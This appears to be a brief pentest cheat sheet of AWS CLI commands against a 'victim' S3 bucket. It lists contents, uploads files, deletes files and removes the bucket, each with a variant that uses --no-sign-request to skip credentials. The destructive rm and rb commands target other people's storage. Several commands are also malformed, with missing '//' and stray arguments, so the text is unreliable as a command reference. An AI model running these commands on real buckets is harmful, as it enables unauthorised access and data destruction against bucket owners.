## amazon_s3

***Bucket is a logical unit of storage in Amazon Web Services (AWS) object storage service, Simple Storage Solution S3. 
Buckets are used to store objects, which consist of data and metadata that describes the data.***

### awscli install
- pip3 install awscli

### aws configue if we have data
- aws configure

### list aws bucket
- aws s3 ls s3://<victim_aws_bucket_name>

***with no creds***
- aws s3 ls s3://<victim_aws_bucket_name> --no-sign-request

### file upload 
- echo "test" >> file.txt
- aws s3 cp file.txt s3:<victim_aws_bucket_name>/file.txt 

***with no creds***
- aws s3 cp file.txt s3:<victim_aws_bucket_name>/file.txt  --no-sign-request

### file remove
- aws s3 rm file.txt s3:<victim_aws_bucket_name>/file.txt
  
***with no creds***
- aws s3 rm file.txt s3:<victim_aws_bucket_name>/file.txt  --no-sign-request

### bucket remove
- aws s3 rb file.txt s3:<victim_aws_bucket_name>

***with no creds***
- aws s3 rb file.txt s3:<victim_aws_bucket_name>  --no-sign-request

### bucket list recursive
- aws s3 ls s3://<victim_aws_bucket_name> . --recursive --no-sign-request
in this case, aws return stack trace with file to which we have not got access
